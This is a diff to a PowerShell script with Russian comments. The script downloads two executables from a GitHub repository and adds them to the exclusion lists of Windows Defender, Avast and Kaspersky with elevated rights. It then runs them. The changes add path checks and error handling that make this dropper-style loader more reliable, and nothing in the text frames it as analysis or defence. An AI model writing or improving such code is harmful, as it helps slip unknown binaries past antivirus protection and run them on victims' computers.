@@ -11,7 +11,11 @@ function Add-To-Avast-Exclusion {
     param (
         [string]$filePath
     )
-    Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
+    if (Test-Path "C:\Program Files\AVAST Software\Avast\avast.exe") {
+        Start-Process -FilePath "C:\Program Files\AVAST Software\Avast\avast.exe" -ArgumentList "/exclude add $filePath" -Verb RunAs -Wait
+    } else {
+        Write-Output "Avast Antivirus не найден."
+    }
 }
 
 # Функция для добавления файла в исключения Kaspersky Antivirus
@@ -19,16 +23,29 @@ function Add-To-Kaspersky-Exclusion {
     param (
         [string]$filePath
     )
-    Start-Process -FilePath "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com" -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
+    $kasperskyPath = "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Anti-Virus 20.xx\avp.com"
+    if (Test-Path $kasperskyPath) {
+        Start-Process -FilePath $kasperskyPath -ArgumentList "/add-exclusion=$filePath" -Verb RunAs -Wait
+    } else {
+        Write-Output "Kaspersky Antivirus не найден."
+    }
 }
 
 # Пути к файлам
 $file1 = "C:\1.exe"
 $file2 = "C:\2.exe"
 
-# Загрузка файлов
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile $file1
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/2.exe" -OutFile $file2
+# Проверка существования URL перед загрузкой
+$urls = @("https://github.com/cs2cc/s/raw/main/1.exe", "https://github.com/cs2cc/s/raw/main/2.exe")
+
+$urls | ForEach-Object {
+    $outFile = if ($_ -like "*1.exe") { $file1 } else { $file2 }
+    try {
+        Invoke-WebRequest -Uri $_ -OutFile $outFile -ErrorAction Stop
+    } catch {
+        Write-Output "Не удалось загрузить файл по адресу $_"
+    }
+}
 
 # Добавление в исключения Windows Defender
 Add-To-WindowsDefender-Exclusion -filePath $file1
@@ -43,5 +60,14 @@ Add-To-Kaspersky-Exclusion -filePath $file1
 Add-To-Kaspersky-Exclusion -filePath $file2
 
 # Запуск файлов
-Start-Process -FilePath $file1
-Start-Process -FilePath $file2
+if (Test-Path $file1) {
+    Start-Process -FilePath $file1
+} else {
+    Write-Output "$file1 не найден."
+}
+
+if (Test-Path $file2) {
+    Start-Process -FilePath $file2
+} else {
+    Write-Output "$file2 не найден."
+}
